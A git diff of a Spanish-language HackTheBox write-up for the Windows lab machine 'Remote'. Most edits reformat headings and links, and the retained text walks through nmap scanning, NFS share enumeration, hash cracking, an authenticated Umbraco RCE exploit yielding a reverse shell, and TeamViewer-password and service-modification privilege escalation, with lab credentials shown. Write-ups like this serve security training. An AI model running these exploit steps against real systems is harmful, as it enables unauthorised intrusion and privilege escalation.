@@ -1,19 +1,63 @@
-# Estadísticas
+---
+tags:
+  - Web Enumeration
+  - NFS Enumeration - Showmount
+  - Information Leakage
+  - Abusing Umbraco Admin Panel
+  - Umbraco CMS - Remote Code Execution by authenticated administrators
+  - Obtaining the TeamViewer password from the system registers (AES128 - CBC) [Privilege Escalation]
+---
+
+# Remote <!-- omit from toc -->
+
+Write-up de la máquina Remote de [HackTheBox](https://hackthebox.com).
+
+![Cover de Remote](images/cover.png)
+
+## Índice <!-- omit from toc -->
+
+- [Introducción](#introducción)
+  - [Estadísticas](#estadísticas)
+- [Reconocimiento](#reconocimiento)
+  - [Escaneo de host](#escaneo-de-host)
+    - [Escaneo completo de puertos](#escaneo-completo-de-puertos)
+    - [Escaneo específico](#escaneo-específico)
+- [Enumeración](#enumeración)
+  - [Servicios](#servicios)
+    - [http - 80](#http---80)
+      - [ffuf](#ffuf)
+      - [Manual](#manual)
+    - [mountd - 2049](#mountd---2049)
+- [Explotación](#explotación)
+  - [Cracking de hash obtenido](#cracking-de-hash-obtenido)
+  - [RCE](#rce)
+- [Post Explotación](#post-explotación)
+  - [Enumeración](#enumeración-1)
+  - [Escalación de privilegios](#escalación-de-privilegios)
+    - [iis apppool → nt authority system](#iis-apppool--nt-authority-system)
+      - [TeamViewer](#teamviewer)
+      - [Modificación de servicios](#modificación-de-servicios)
+      - [JuicyPotato](#juicypotato)
+- [Referencias](#referencias)
+
+## Introducción
+
+### Estadísticas
 
 | Característica | Descripción |
 |---|---|
-| Nombre | [Remote](https://www.hackthebox.com/home/machines/profile/234) |
+| Nombre | [Remote](https://app.hackthebox.com/machines/Remote) |
 | OS | Windows |
 | Dificultad oficial | Easy |
-| Dificultad de comunidad | ![Dificultad](images/difficulty.png) |
+| Dificultad de comunidad | ![Dificultad](images/diff.png) |
 | Puntos | 20 |
-| Creadores | [mrb3n](https://www.hackthebox.com/home/users/profile/2984) |
+| Creadores | [mrb3n](https://app.hackthebox.com/users/2984) |
 
-# Reconocimiento
+## Reconocimiento
 
-## Escaneo de host
+### Escaneo de host
 
-### Escaneo completo de puertos
+#### Escaneo completo de puertos
 
 ```bash
 └─$ sudo nmap -sS --min-rate 5000 -vvv -open -p- -n -Pn -oG nmap/all_ports_ss $TARGET
@@ -65,7 +109,7 @@ Nmap done: 1 IP address (1 host up) scanned in 13.33 seconds
            Raw packets sent: 65924 (2.901MB) | Rcvd: 65535 (2.621MB)
 ```
 
-### Escaneo específico
+#### Escaneo específico
 
 ```bash
 └─$ nmap -sCV -p 21,80,111,135,139,445,2049,5985,47001,49664,49665,49666,49667,49678,49679,49680 -n -Pn -oN nmap/targeted $TARGET
@@ -134,13 +178,13 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 102.15 seconds
 ```
 
-# Enumeración
+## Enumeración
 
-## Servicios
+### Servicios
 
-### http - 80
+#### http - 80
 
-#### ffuf
+##### ffuf
 
 Al navegar a través del sitio disponible y no encontrar información relevante en primera instancia, se decidió enumerar directorios de manera automática mediante:
 
@@ -152,7 +196,7 @@ Encontrando así el directorio `umbraco` el cual no pareció común bajo el cont
 
 ![Directorio encontrado](images/enum_1.png)
 
-#### Manual
+##### Manual
 
 Al navegar manualmente al directorio se visualizó un login, a lo que posteriormente se buscó información relacionada encontrando que se trataba de un sistema de gestor de contenidos (CMS).
 
@@ -163,7 +207,7 @@ Al buscar rutas de explotación se encontró un [exploit](https://www.exploit-db
 - Realizar búsqueda de credenciales por algún sitio *(preferente)*.
 - Realizar fuerza bruta al login *(siempre último recurso)*.
 
-### mountd - 2049
+#### mountd - 2049
 
 Al identificar el servicio y encontrar que se trataba de exposición de puntos de montaje a través de red, se hizo uso de `showmount -e 10.10.10.180` visualizando así el montaje `site_backups`.
 
@@ -199,9 +243,9 @@ Para interpretar los caracteres legibles identificando así las credenciales `ad
 
 ![Credenciales expuestas](images/enum_7.png)
 
-# Explotación
+## Explotación
 
-## Cracking de hash obtenido
+### Cracking de hash obtenido
 
 Guardando el hash del usuario admin en un archivo y haciendo uso de:
 
@@ -213,7 +257,7 @@ Se obtuvo la contraseña `admin@htb.local:baconandcheese`.
 
 ![Crackeo de hash](images/exploit_1.png)
 
-## RCE
+### RCE
 
 Después de validar las credenciales con el portal de umbraco y descargar el exploit previamente encontrado, se ejecutó:
 
@@ -233,9 +277,9 @@ python exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c
 
 ![Reverse shell](images/exploit_3.png)
 
-# Post Explotación
+## Post Explotación
 
-## Enumeración
+### Enumeración
 
 Verificando los privilegios que se tienen con el usuario obtenido haciendo uso de:
 
@@ -261,11 +305,11 @@ También dentro de la salida de `winPEAS` se visualiza que se cuenta con acceso 
 
 ![Permisos de servicio UsoSvc](images/post_4.png)
 
-## Escalación de privilegios
+### Escalación de privilegios
 
-### iis apppool &rarr; nt authority system
+#### iis apppool &rarr; nt authority system
 
-#### TeamViewer
+##### TeamViewer
 
 Al subir el script de powershell a la máquina, cargarlo como módulo en la sesión con `Import-Module` y ejecutar la función de extración `Get-TeamViewPasswords`, se descifró la contraseña `!R3m0te!`.
 
@@ -283,7 +327,7 @@ Obteniendo así acceso como `NT AUTHORITY\SYSTEM`.
 
 ![Acceso como nt authority system](images/post_6.png)
 
-#### Modificación de servicios
+##### Modificación de servicios
 
 Mediante:
 
@@ -315,11 +359,11 @@ Se logró tener acceso como `NT AUTHORITY\SYSTEM` satisfactoriamente.
 
 ![Acceso como nt authority system](images/post_9.png)
 
-#### JuicyPotato
+##### JuicyPotato
 
 Debido al no tener éxito al aprovecharse del privilegio ni con el uso de [JuicyPotato](https://github.com/ohpe/juicy-potato) ni con [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) se buscó corroborar con el writeup oficial, el cuál indica que debería ser válido el método, sin embargo, no se logró satisfactoriamente.
 
-# Referencias
+## Referencias
 
 - [Exploit de Umbraco](https://www.exploit-db.com/exploits/49488).
 - [Github - Exploit de Umbraco](https://github.com/noraj/Umbraco-RCE).
@@ -327,4 +371,4 @@ Debido al no tener éxito al aprovecharse del privilegio ni con el uso de [Juicy
 - [Microsoft - Importación de módulo en powershell](https://docs.microsoft.com/en-us/powershell/scripting/developer/module/importing-a-powershell-module?view=powershell-7.2).
 - [Github - Descifrado de contraseñas TeamViewer](https://github.com/zaphoxx/WatchTV).
 - [Descrifrado de contraseñas TeamViewer post de blog](https://whynotsecurity.com/blog/teamviewer/).
-- [HackTricks - Local Privilege Escalation - Services](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services)
+- [HackTricks - Local Privilege Escalation - Services](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services).
